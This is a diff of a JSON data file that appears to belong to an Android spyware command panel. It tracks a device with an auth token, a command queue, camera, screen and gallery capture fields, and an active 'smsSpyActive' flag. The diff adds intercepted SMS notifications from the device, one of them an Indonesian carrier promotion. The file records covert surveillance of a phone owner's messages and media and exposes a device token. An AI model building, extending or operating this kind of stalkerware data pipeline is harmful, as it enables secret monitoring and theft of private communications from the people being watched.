@@ -1113,7 +1113,7 @@
     "deviceName": "HP-ZAL7SEX-31CE",
     "ownerUsername": "Zal7Sex",
     "token": "8bb07e24912da81df58390f0d6dd139a",
-    "lastSeen": 1776524778408,
+    "lastSeen": 1776524787478,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-18T14:57:09.343Z",
@@ -1128,7 +1128,24 @@
     "lastPhoto": null,
     "lastScreenFrame": null,
     "smsSpyActive": true,
-    "smsMessages": [],
+    "smsMessages": [
+      {
+        "appName": "Messages",
+        "sender": "IM3PAKET",
+        "content": "Jangan lupa, 1 hari lagi pkt FREEDOM INTERNET 5GB 2HARI akan berakhir. Ayo isi ulang pulsa Kamu agar bisa terus menikmati pkt internet terbaik",
+        "time": "18/04 22:06",
+        "pkg": "com.google.android.apps.messaging",
+        "receivedAt": 1776524791293
+      },
+      {
+        "appName": "Messages",
+        "sender": "",
+        "content": "Messages is doing work in the background",
+        "time": "18/04 22:06",
+        "pkg": "com.google.android.apps.messaging",
+        "receivedAt": 1776524790689
+      }
+    ],
     "galleryPhotos": [],
     "galleryDone": false,
     "contacts": [],
